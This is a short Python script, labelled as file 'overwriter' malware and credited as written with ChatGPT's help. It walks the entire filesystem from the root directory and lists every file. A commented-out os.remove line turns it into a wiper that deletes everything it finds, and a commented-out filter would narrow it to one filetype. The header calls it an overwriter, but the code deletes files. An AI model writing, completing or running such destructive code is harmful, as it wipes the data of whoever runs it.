# File "overwriter" malware
# DO NOT RUN EXCEPT ON VM
# A. Kercheval 4/16/25, with help from ChatGPT :)
import os

def find_and_delete_files(start_path="/"):
    for dirpath, dirnames, filenames in os.walk(start_path):
        for filename in filenames:
            # Uncomment and modify to target a specific filetype
            # if filename.lower().endswith(""):
                file_path = os.path.join(dirpath, filename)
                try:
                    print(f"Found: {file_path}")
                    # Uncomment the next line to actually delete files
                    # os.remove(file_path)
                    # print(f"Deleted: {file_path}")
                except Exception as e:
                    print(f"Could not delete {file_path}: {e}")

# Optional additional function to use, returns T/F indicating
# whether file is marked as executable
def is_exe(fpath):
        return os.path.isfile(fpath) and os.access(fpath, os.X_OK)

if __name__ == "__main__":
    find_and_delete_files()
